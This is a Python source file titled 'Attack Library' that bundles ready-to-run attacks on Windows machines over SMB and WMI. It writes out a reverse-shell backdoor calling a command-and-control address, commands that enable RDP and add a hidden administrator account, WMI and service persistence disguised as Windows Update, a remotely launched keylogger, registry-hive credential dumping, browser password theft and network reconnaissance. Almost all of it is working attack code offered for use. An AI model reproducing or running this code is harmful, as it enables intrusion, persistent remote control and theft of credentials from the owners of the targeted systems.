#!/usr/bin/env python3
"""
Attack Library - All available attacks in one place
"""

import subprocess
import os
import time
from smb_lateral import SMBLateralMovement
from wmi_remote import WMIRemoteExecution

class AttackLibrary:
    def __init__(self):
        self.smb = SMBLateralMovement()
        self.wmi = WMIRemoteExecution()
        self.attacks = self._initialize_attacks()
    
    def _initialize_attacks(self):
        """Define all available attacks"""
        return {
            # REMOTE ACCESS ATTACKS
            'smb_backdoor': {
                'name': 'SMB Backdoor',
                'description': 'Deploy backdoor via SMB shares',
                'category': 'remote_access',
                'function': self.attack_smb_backdoor
            },
            'wmi_persistence': {
                'name': 'WMI Persistence', 
                'description': 'Create WMI event for persistence',
                'category': 'remote_access',
                'function': self.attack_wmi_persistence
            },
            'rdp_backdoor': {
                'name': 'RDP Backdoor',
                'description': 'Enable RDP and add backdoor user',
                'category': 'remote_access', 
                'function': self.attack_rdp_backdoor
            },
            'service_backdoor': {
                'name': 'Service Backdoor',
                'description': 'Create Windows service for persistence',
                'category': 'remote_access',
                'function': self.attack_service_backdoor
            },
            
            # DATA COLLECTION ATTACKS
            'keylogger_deploy': {
                'name': 'Keylogger',
                'description': 'Deploy keylogger to capture keystrokes',
                'category': 'data_collection',
                'function': self.attack_keylogger
            },
            'credential_dumper': {
                'name': 'Credential Dumper',
                'description': 'Dump passwords and hashes from memory',
                'category': 'data_collection',
                'function': self.attack_credential_dumper
            },
            'browser_stealer': {
                'name': 'Browser Stealer',
                'description': 'Steal browser passwords and cookies',
                'category': 'data_collection',
                'function': self.attack_browser_stealer
            },
            'network_sniffer': {
                'name': 'Network Sniffer',
                'description': 'Capture network traffic',
                'category': 'data_collection',
                'function': self.attack_network_sniffer
            },
            
            # RECONNAISSANCE ATTACKS
            'system_info': {
                'name': 'System Info',
                'description': 'Gather detailed system information',
                'category': 'reconnaissance', 
                'function': self.attack_system_info
            },
            'network_scan': {
                'name': 'Network Scan',
                'description': 'Scan network from target perspective',
                'category': 'reconnaissance',
                'function': self.attack_network_scan
            },
            'user_enumeration': {
                'name': 'User Enumeration',
                'description': 'Enumerate users and groups',
                'category': 'reconnaissance',
                'function': self.attack_user_enumeration
            }
        }
    
    def get_available_attacks(self):
        """Get all available attacks"""
        return self.attacks
    
    def get_attack_info(self, attack_id):
        """Get information about specific attack"""
        return self.attacks.get(attack_id, {})
    
    def execute_attack(self, attack_id, target_ip):
        """Execute specific attack on target"""
        attack = self.attacks.get(attack_id)
        if attack and attack['function']:
            return attack['function'](target_ip)
        else:
            return {'success': False, 'error': 'Attack not found'}
    
    # REMOTE ACCESS ATTACKS
    def attack_smb_backdoor(self, target_ip):
        """Deploy backdoor via SMB"""
        print(f"Deploying SMB backdoor to {target_ip}")
        
        shares = self.smb.discover_shares(target_ip)
        if not shares:
            return {'success': False, 'error': 'No SMB shares accessible'}
        
        # Create simple backdoor
        backdoor_content = '''
import socket
import subprocess
import os
import time

# Simple backdoor that connects back
def connect_back():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('192.168.1.100', 4444))  # Your C2 IP
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                output = subprocess.getoutput(command)
                s.send(output.encode())
            s.close()
        except:
            time.sleep(60)  # Retry every minute

if __name__ == "__main__":
    connect_back()
'''
        
        # Save backdoor locally
        with open('smb_backdoor.py', 'w') as f:
            f.write(backdoor_content)
        
        # Copy to target
        for share in shares:
            if self.smb.check_share_access(target_ip, share):
                result = self.smb.copy_file_via_smb('smb_backdoor.py', target_ip, share)
                if 'success' in result.lower():
                    return {'success': True, 'message': f'Backdoor deployed to {share}', 'file': 'smb_backdoor.py'}
        
        return {'success': False, 'error': 'Could not deploy backdoor'}
    
    def attack_wmi_persistence(self, target_ip):
        """Create WMI persistence"""
        print(f"Creating WMI persistence on {target_ip}")
        
        if not self.wmi.test_wmi_connectivity(target_ip):
            return {'success': False, 'error': 'WMI not accessible'}
        
        # Create WMI event filter and consumer for persistence
        persistence_script = '''
$FilterArgs = @{
    Name = 'WindowsUpdateFilter'
    EventNameSpace = 'root\\cimv2' 
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'WindowsUpdateConsumer'
    CommandLineTemplate = 'cmd.exe /c echo WMI persistence active'
}
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
$Binding = Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
'''
        
        # Execute via WMI
        result = self.wmi.remote_code_execution(target_ip, f'powershell -Command "{persistence_script}"')
        return result
    
    def attack_rdp_backdoor(self, target_ip):
        """Enable RDP and add backdoor user"""
        print(f"Setting up RDP backdoor on {target_ip}")
        
        commands = [
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
            'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
            'net user backdooruser Password123! /add',
            'net localgroup administrators backdooruser /add',
            'net localgroup "Remote Desktop Users" backdooruser /add'
        ]
        
        results = []
        for cmd in commands:
            result = self.wmi.remote_code_execution(target_ip, cmd)
            results.append({'command': cmd, 'success': result.get('success', False)})
        
        success_count = sum(1 for r in results if r['success'])
        return {'success': success_count > 0, 'results': results}
    
    def attack_service_backdoor(self, target_ip):
        """Create Windows service for persistence"""
        print(f"Creating service backdoor on {target_ip}")
        
        service_name = "WindowsUpdateService"
        service_cmd = "cmd.exe /c echo Service backdoor active"
        
        # Create service
        create_cmd = f'sc \\\\{target_ip} create "{service_name}" binPath= "{service_cmd}" start= auto'
        result = subprocess.run(create_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            return {'success': True, 'message': f'Service {service_name} created'}
        else:
            return {'success': False, 'error': result.stderr}
    
    # DATA COLLECTION ATTACKS
    def attack_keylogger(self, target_ip):
        """Deploy keylogger"""
        print(f"Deploying keylogger to {target_ip}")
        
        # Simple keylogger script
        keylogger_content = '''
import keyboard
import time
from datetime import datetime

def keylogger():
    log_file = "C:\\Windows\\Temp\\keylog.txt"
    
    def on_key(event):
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {event.name}\\n")
    
    keyboard.on_press(on_key)
    
    while True:
        time.sleep(60)

if __name__ == "__main__":
    keylogger()
'''
        
        # Save and deploy
        with open('keylogger.py', 'w') as f:
            f.write(keylogger_content)
        
        shares = self.smb.discover_shares(target_ip)
        for share in shares:
            if self.smb.check_share_access(target_ip, share):
                result = self.smb.copy_file_via_smb('keylogger.py', target_ip, share)
                if 'success' in result.lower():
                    # Try to execute
                    exec_result = self.wmi.remote_code_execution(target_ip, f'python "\\\\{target_ip}\\{share}\\keylogger.py"')
                    return {'success': True, 'message': 'Keylogger deployed and executed'}
        
        return {'success': False, 'error': 'Keylogger deployment failed'}
    
    def attack_credential_dumper(self, target_ip):
        """Dump credentials from target"""
        print(f"Dumping credentials from {target_ip}")
        
        # Mimikatz-style commands (simulated)
        commands = [
            'reg save hklm\\sam sam.save',
            'reg save hklm\\system system.save',
            'reg save hklm\\security security.save',
            'tasklist | findstr lsass.exe'
        ]
        
        results = []
        for cmd in commands:
            result = self.wmi.remote_code_execution(target_ip, cmd)
            results.append({'command': cmd, 'success': result.get('success', False)})
        
        success_count = sum(1 for r in results if r['success'])
        return {'success': success_count > 0, 'results': results}
    
    def attack_browser_stealer(self, target_ip):
        """Steal browser data"""
        print(f"Stealing browser data from {target_ip}")
        
        # Commands to copy browser data files
        browser_paths = [
            'copy "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" "C:\\Windows\\Temp\\chrome_passwords.db"',
            'copy "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default\\key4.db" "C:\\Windows\\Temp\\firefox_keys.db"',
            'copy "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data" "C:\\Windows\\Temp\\edge_passwords.db"'
        ]
        
        results = []
        for cmd in browser_paths:
            result = self.wmi.remote_code_execution(target_ip, cmd)
            results.append({'command': cmd, 'success': result.get('success', False)})
        
        success_count = sum(1 for r in results if r['success'])
        return {'success': success_count > 0, 'results': results}
    
    def attack_network_sniffer(self, target_ip):
        """Deploy network sniffer"""
        print(f"Deploying network sniffer to {target_ip}")
        
        # Simple network monitoring commands
        commands = [
            'netsh trace start capture=yes persistent=yes maxsize=100',
            'netstat -ano | findstr ESTABLISHED',
            'arp -a'
        ]
        
        results = []
        for cmd in commands:
            result = self.wmi.remote_code_execution(target_ip, cmd)
            results.append({'command': cmd, 'success': result.get('success', False), 'output': result.get('output', '')})
        
        success_count = sum(1 for r in results if r['success'])
        return {'success': success_count > 0, 'results': results}
    
    # RECONNAISSANCE ATTACKS
    def attack_system_info(self, target_ip):
        """Gather system information"""
        print(f"Gathering system info from {target_ip}")
        
        commands = {
            'systeminfo': 'systeminfo',
            'network_info': 'ipconfig /all',
            'users': 'net user',
            'groups': 'net localgroup',
            'processes': 'tasklist',
            'services': 'net start',
            'shares': 'net share'
        }
        
        results = {}
        for name, cmd in commands.items():
            result = self.wmi.remote_code_execution(target_ip, cmd)
            results[name] = {
                'success': result.get('success', False),
                'output': result.get('output', '')[:500]  # First 500 chars
            }
        
        success_count = sum(1 for r in results.values() if r['success'])
        return {'success': success_count > 0, 'info': results}
    
    def attack_network_scan(self, target_ip):
        """Scan network from target's perspective"""
        print(f"Scanning network from {target_ip}")
        
        scan_script = '''
for /l %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i >nul && echo 192.168.1.%i is up
net view
arp -a
'''
        
        result = self.wmi.remote_code_execution(target_ip, scan_script)
        return result
    
    def attack_user_enumeration(self, target_ip):
        """Enumerate users and groups"""
        print(f"Enumerating users on {target_ip}")
        
        commands = [
            'net user',
            'net localgroup administrators',
            'net localgroup "Remote Desktop Users"',
            'net group "Domain Admins" /domain',
            'whoami /all'
        ]
        
        results = []
        for cmd in commands:
            result = self.wmi.remote_code_execution(target_ip, cmd)
            results.append({
                'command': cmd,
                'success': result.get('success', False),
                'output': result.get('output', '')[:200]
            })
        
        success_count = sum(1 for r in results if r['success'])
        return {'success': success_count > 0, 'enumeration': results}
